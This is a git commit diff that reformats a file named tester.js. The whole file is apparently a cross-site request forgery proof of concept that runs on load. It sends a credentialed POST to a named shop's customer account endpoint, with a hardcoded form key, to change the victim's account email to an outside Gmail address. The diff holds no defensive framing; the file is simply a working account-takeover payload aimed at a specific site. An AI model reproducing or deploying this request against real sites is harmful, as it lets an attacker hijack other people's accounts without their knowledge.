589dbe053ec72f4664dc532793e24ab8eece7781
rentixeli <73320873+rentixeli@users.noreply.github.com>
2021-09-29 13:49:43 +0300

    Update tester.js

--- tester.js
+++ tester.js
@@ -1,32 +1,30 @@
-<script>
 
-      function submitRequest()
+function submitRequest()
 
-      {
+{
 
-        var xhr = new XMLHttpRequest();
+  var xhr = new XMLHttpRequest();
 
-        xhr.open("POST", "https://www.fixfixfixfix.co.il/customer/ajax/post/", true);
+  xhr.open("POST", "https://www.fixfixfixfix.co.il/customer/ajax/post/", true);
 
-        xhr.setRequestHeader("Accept", "application/json, text/javascript, */*; q=0.01");
+  xhr.setRequestHeader("Accept", "application/json, text/javascript, */*; q=0.01");
 
-        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+  xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
 
-        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
 
-        xhr.withCredentials = true;
+  xhr.withCredentials = true;
 
-        var body = "form_key=xCThnAxL71YFV23A&bot_validation=1&type=edit&firstname=test&lastname=tester&telephone=&email=steaminfo.supp@gmail.com";
+  var body = "form_key=xCThnAxL71YFV23A&bot_validation=1&type=edit&firstname=test&lastname=tester&telephone=&email=steaminfo.supp@gmail.com";
 
-        var aBody = new Uint8Array(body.length);
+  var aBody = new Uint8Array(body.length);
 
-        for (var i = 0; i < aBody.length; i++)
+  for (var i = 0; i < aBody.length; i++)
 
-          aBody[i] = body.charCodeAt(i); 
+    aBody[i] = body.charCodeAt(i); 
 
-        xhr.send(new Blob([aBody]));
+  xhr.send(new Blob([aBody]));
 
-      }
+}
 
-      submitRequest();
-</script>
+submitRequest();
